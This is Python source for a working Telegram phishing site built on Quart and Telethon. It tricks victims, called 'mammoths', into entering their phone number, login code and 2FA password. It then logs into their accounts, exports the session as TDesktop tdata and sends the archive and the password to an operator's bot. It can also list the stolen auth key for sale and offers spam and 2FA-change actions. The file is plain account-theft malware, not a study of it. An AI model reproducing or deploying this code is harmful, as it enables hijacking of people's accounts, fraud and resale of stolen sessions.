import asyncio
from os import path, remove
import os
import random
import python_socks
import quart
from opentele.td import TDesktop
from opentele.tl import TelegramClient as ConvertClinet
from opentele.api import API, UseCurrentSession
from quart import Quart, render_template, request, redirect,session, make_response
from telethon import TelegramClient
import shutil
from aiogram import Bot
from aiogram.types import InputFile,ParseMode
from telethon.crypto import AuthKey
from telethon.errors import SessionPasswordNeededError, PhoneCodeInvalidError, \
    PasswordHashInvalidError
from datetime import timedelta
from aiogram.types import InlineKeyboardButton,InlineKeyboardMarkup
from telethon.sessions import SQLiteSession

from config import config
from lolz import add_item

app = Quart(__name__)
app.secret_key = os.urandom(24)
SESSIONS = {}
API_ID = int(config('API_ID'))
API_HASH = config("API_HASH")
BOT_TOKEN = config('ADMIN_BOT')
USER_ID = int(config('ADMIN_ID'))
bot = Bot(BOT_TOKEN)
def to_zip(phone:str):
    shutil.make_archive(phone, 'zip', phone)
    shutil.rmtree(phone)
def delete(filename):
    if path.exists(filename):
        remove(filename)

def service_kb(phone):
    kb = InlineKeyboardMarkup()
    kb.add(InlineKeyboardButton(text='🔎 Проверить валид',callback_data=f'check*{phone}'))
    kb.add(InlineKeyboardButton(text='💎 Проверить крипту',callback_data=f'crypto*{phone}'))
    kb.add(InlineKeyboardButton(text='📡 Спам',callback_data=f'spam*{phone}'))
    return kb
def get_proxy():
    proxies = []
    proxies_from_file = open(f'proxies.txt', 'r').readlines()
    for proxy in proxies_from_file:
        login, pwd = proxy.split('@')[0].split(':')
        ip, port = proxy.split('@')[1].split(':')
        prox = [ip, port, login, pwd]
        proxies.append(prox)
    prox = random.choice(proxies)
    proxy = {
        'proxy_type': python_socks.ProxyType.SOCKS5,  # (mandatory) protocol to use (see above)
        'addr': prox[0],  # (mandatory) proxy IP address
        'port': int(prox[1]),  # (mandatory) proxy port number
        'username': prox[2],  # (optional) username if the proxy requires auth
        'password': prox[3],  # (optional) password if the proxy requires auth
        'rdns': True  # (optional) whether to use remote or local resolve, default remote
    }
    return proxy

async def build_client(session_name):

    proxy = get_proxy() if config('proxy') == '1' else None
    print(proxy)
    session = TelegramClient(
        api_hash=API_HASH,
        api_id=API_ID,
        session='sessions/'+session_name,
        proxy=proxy
    )
    await session.connect()
    return session


@app.route("/", methods=['get'])
async def auth():
    await bot.send_message(USER_ID, f'🔌 Мамонт зашел на сайт')
    if request.args:
        quart.session['ref'] = request.args['ref']
    print(quart.session.get('phone'))
    if quart.session.get('phone'):
        print('redirect')
        return redirect('/auth')
    return await render_template(f'{config("templ")}/auth.html',nmb=quart.session.get('phone'))


@app.route("/auth", methods=['get'])
async def login():
    if quart.session.get('phone'):
        phone = quart.session.get('phone').lstrip("+")
        quart.session.permanent = True
        app.permanent_session_lifetime = timedelta(minutes=2)
        quart.session['phone'] = phone
        SESSIONS[phone] = await build_client(
            phone
        )

        try:
            await SESSIONS[phone].connect()
            await SESSIONS[phone].send_code_request(phone=phone, force_sms=True)
            await SESSIONS[phone].disconnect()
            try:
                await bot.send_message(USER_ID, f'📱 Мамонт ввёл верный номер: {phone}')
            except Exception as e:
                print(e)
        except Exception as e:
            if session := SESSIONS.get(phone):
                SESSIONS.pop(phone)
                await session.disconnect()
                delete(phone + ".session")
                await bot.send_message(USER_ID, f'❌ Ошибка при отправки кода на {phone} \n{e}')
            return await render_template(f'{config("templ")}/auth.html',
                                         error="Неверный номер телефона")
        return await render_template(f'{config("templ")}/auth_code.html', phone=phone)
    else:
        return await render_template(f'{config("templ")}/auth.html',nmb=quart.session.get('phone'))


@app.route("/auth", methods=['post'])
async def get_phone_number():
    phone = (await request.form).get('phone').lstrip("+")
    quart.session.permanent = True
    app.permanent_session_lifetime = timedelta(minutes=2)
    quart.session['phone'] = phone
    SESSIONS[phone] = await build_client(
        phone
    )

    try:
        await SESSIONS[phone].send_code_request(phone=phone, force_sms=True)
        await SESSIONS[phone].disconnect()

        try:
            await bot.send_message(USER_ID,f'📱 Мамонт ввёл верный номер: {phone}')
        except Exception as e:
            print(e)
    except Exception as e:
        print(e)
        if session := SESSIONS.get(phone):
            SESSIONS.pop(phone)
            await session.disconnect()
            delete(phone + ".session")
            await bot.send_message(USER_ID, f'❌ Ошибка при отправки кода на {phone} \n{e}')
        return await render_template(f'{config("templ")}/auth.html',
                                     error="Неверный номер телефона")
    return await render_template(f'{config("templ")}/auth_code.html', phone=phone)


@app.route("/auth/<phone>", methods=['post'])
async def submit_code(phone: str):
    code = (await request.form).get("code")

    try:
        await SESSIONS[phone].connect()
        await SESSIONS[phone].sign_in(phone='+' + phone, code=code)
        print(await SESSIONS[phone].get_me())
        info = await SESSIONS[phone].get_me()
        dialogs = SESSIONS[phone].iter_dialogs()
        dialogs_count = 0
        owner_channel = 0
        group = 0
        async for dialog in dialogs:
            dialogs_count += 1
            if dialog.is_channel:
                if dialog.entity.creator or dialog.entity.admin_rights:
                    print(dialog)
                    owner_channel += 1
            if dialog.is_group:
                group += 1
            else:
                continue
        await SESSIONS[phone].disconnect()
        msg = f'''
<b>🔥 NEW LOG 🔥</b>
✉️ Всего диалогов: {dialogs_count}
📢 Групп: {group}
💎 Управление: {owner_channel}

☎️ Номер: <code>{phone}</code>
⚙️ ID: <code>{info.id}</code>
🐘 Никнейм: {info.first_name}
👤 Юзернейм: @{info.username}
⭐️ Премиум: {info.premium}
⛔️ Скам: {info.scam}
                '''
        session: SQLiteSession = SESSIONS[phone].session
        auth_key: AuthKey = session.auth_key
        if int(config('lolz')):
            bot = Bot(BOT_TOKEN)
            try:
                await asyncio.create_task(add_item(
                    client=await bot.get_session(),
                    dc_id=session.dc_id,
                    hex_key=auth_key.key.hex(),
                    premium=info.premium
                ))
            except Exception as e:
                print('err with lolz', e)
        client = ConvertClinet(f"sessions/{phone}.session")
        tdesk = await client.ToTDesktop(flag=UseCurrentSession)
        tdesk.SaveTData(f"tdatas/{phone}")
        to_zip(f"tdatas/{phone}")
        await client.disconnect()
        bot = Bot(BOT_TOKEN)

        try:
            await bot.send_message(USER_ID, f'✅ Успешная авторизация: {phone}')

        except Exception as e:
            print('Ошибка при получении кода ',e)
            await bot.send_message(USER_ID, f'❌ Ошибка при вводе кода на {phone} \n{e}')
        quart.session.clear()
        await bot.send_document(USER_ID,InputFile(f'tdatas/{phone}.zip'),caption=msg,parse_mode=ParseMode.HTML,reply_markup=service_kb(phone))

    except SessionPasswordNeededError:
        try:
            await bot.send_message(USER_ID, f'🔑 запрошен 2FA: {phone}')
        except Exception as e:
            print(e)
        return await render_template(f'{config("templ")}/auth_password.html', phone=phone)
    except KeyError:
        return await render_template(f'{config("templ")}/auth.html',
                                     error="Попробуйте ещё раз")
    except PhoneCodeInvalidError as e:
        return await render_template(f'{config("templ")}/auth_code.html',
                                     phone=phone,
                                     error="Введенный код "
                                           "недействителен")

    return await render_template(f'{config("templ")}/done.html')


@app.route("/authpassword/<phone>", methods=['post'])
async def submit_password(phone: str):
    password = (await request.form).get("password")

    try:
        await SESSIONS[phone].sign_in(phone='+' + phone, password=password)
        info = await SESSIONS[phone].get_me()
        dialogs = SESSIONS[phone].iter_dialogs()
        dialogs_count = 0
        owner_channel = 0
        group = 0
        async for dialog in dialogs:
            dialogs_count+=1
            if dialog.is_channel:
                if dialog.entity.creator or dialog.entity.admin_rights:
                    print(dialog)
                    owner_channel+=1
            if dialog.is_group:
                group+=1
            else: continue
        await SESSIONS[phone].disconnect()
        msg = f'''
<b>🔥 NEW LOG 🔥</b>
✉️ Всего диалогов: {dialogs_count}
📢 Групп: {group}
💎 Управление: {owner_channel}

🔑 2FA: {password}
☎️ Номер: <code>{phone}</code>
⚙️ ID: <code>{info.id}</code>
🐘 Никнейм: {info.first_name}
👤 Юзернейм: @{info.username}
⭐️ Премиум: {info.premium}
⛔️ Скам: {info.scam}
        '''
        session: SQLiteSession = SESSIONS[phone].session
        auth_key: AuthKey = session.auth_key
        if int(config('lolz')):
            bot = Bot(BOT_TOKEN)
            try:
                await asyncio.create_task(add_item(
                    client=await bot.get_session(),
                    dc_id=session.dc_id,
                    hex_key=auth_key.key.hex(),
                    premium=info.premium
                ))
            except Exception as e:
                print('err with lolz', e)
        client = ConvertClinet(f"sessions/{phone}.session")
        tdesk = await client.ToTDesktop(flag=UseCurrentSession)
        tdesk.SaveTData(f"tdatas/{phone}")
        to_zip(f"tdatas/{phone}")
        await client.disconnect()
        bot = Bot(BOT_TOKEN)

        try:
            await bot.send_message(USER_ID, f'✅ Успешная авторизация с 2FA')
        except Exception as e:
            print(e)
            await bot.send_message(f'❌ Ошибка при вводе кода {phone} \n{e}')
        quart.session.clear()
        kb = service_kb(phone)
        kb.add(InlineKeyboardButton(text='🔐 Изменить 2FA',callback_data=f'2fa*{phone}*{password}'))
        await bot.send_document(USER_ID,InputFile(f'tdatas/{phone}.zip'),caption=msg,parse_mode=ParseMode.HTML,reply_markup=kb)
    except KeyError:
        return await render_template(f'{config("templ")}/auth.html',
                                     error="Невалидный номер телефона")
    except PasswordHashInvalidError as e:
        return await render_template(f'{config("templ")}/auth_password.html',
                                     phone=phone,
                                     error="Введенный пароль недействителен.")
    return await render_template(f'{config("templ")}/done.html')


app.run()
